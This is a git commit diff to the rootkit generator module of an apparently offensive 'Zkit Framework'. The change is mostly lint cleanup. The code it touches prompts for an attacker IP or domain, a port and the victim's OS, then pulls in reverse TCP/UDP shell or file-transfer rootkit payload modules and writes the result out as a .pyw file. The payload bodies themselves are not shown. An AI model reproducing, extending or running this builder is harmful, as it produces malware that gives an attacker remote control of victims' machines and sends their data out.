75541fd3407461d5acf441fad822aa5f5fb7592e
Zer0 <65390948+000Zer000@users.noreply.github.com>
2020-08-01 16:13:09 +0800

    Update rootkit.py

--- core/helper_core/rootkit.py
+++ core/helper_core/rootkit.py
@@ -1,9 +1,10 @@
 "Zkit Framework Rootkit generator . this module talks to _get_rootkit"
 import socket as s
 import sys
-from core.helper_core import Color, create_file, notify, ask_for # NOQA
+from core.helper_core import Color, create_file, notify, ask_for # pylint: disable=C0415; # noqa
 from core.lib.randoms import random_str
 def get_rootkit():
+    "Gets rootkit . talks with rootkit modules"
     t_path = sys.path[0] + "\\Builded\\Rootkit\\"
     _, red, green, _, blue, _, _, _, reset = Color().GetAllColors()
     print("Please Choose Rootkit Type:\n"
@@ -22,14 +23,14 @@ def get_rootkit():
     if choice == "000":
         pass
 
-    elif choice == "TCP" or choice == "UDP":
-        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or 
+    elif choice in("TCP", "UDP"):
+        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or
         # Domain to Send data to it
         # Attacker_Port : An open port on attacker machine
 
         # Getting File PATH
-        u_path = t_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(T_PATH) +
-                                 "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"
+        u_path = t_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(t_path) +
+                                  "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"
 
         # Very important
         notify("question",
@@ -63,17 +64,17 @@ def get_rootkit():
                 strs.append(random_str())
             if r_type == '1':
                 if choice == 'TCP':
-                    import core.lib.payloads.rootkit.reverse_tcp as r # NOQA
+                    import core.lib._payloads.rootkit.reverse_tcp as r # pylint: disable=C0415; # noqa
                 elif choice == 'UDP':
-                    import core.lib.payloads.rootkit.reverse_udp as r # NOQA
+                    import core.lib._payloads.rootkit.reverse_udp as r # pylint: disable=C0415; # noqa
             elif r_type == '2':
                 if choice == 'TCP':
-                    import core.lib.payloads.rootkit.ft_tcp as r # NOQA
+                    import core.lib._payloads.rootkit.ft_tcp as r # pylint: disable=C0415; # noqa
                 elif choice == 'UDP':
-                    import core.lib._payloads.rootkit.ft_udp as r # NOQA
-                    
-            return (r._get_rootkit(
-                    attacker_ip, attacker_port, victim_os, strs), create_file(u_path))
+                    import core.lib._payloads.rootkit.ft_udp as r # pylint: disable=C0415; # noqa
+
+            return (r._get_rootkit( # pylint: disable=W0212; # noqa
+                attacker_ip, attacker_port, victim_os, strs), create_file(u_path))
     else:
         print("Port is either TCP or UDP but yours is not one.try again")
-        
+    return ("Error", "BadInput")
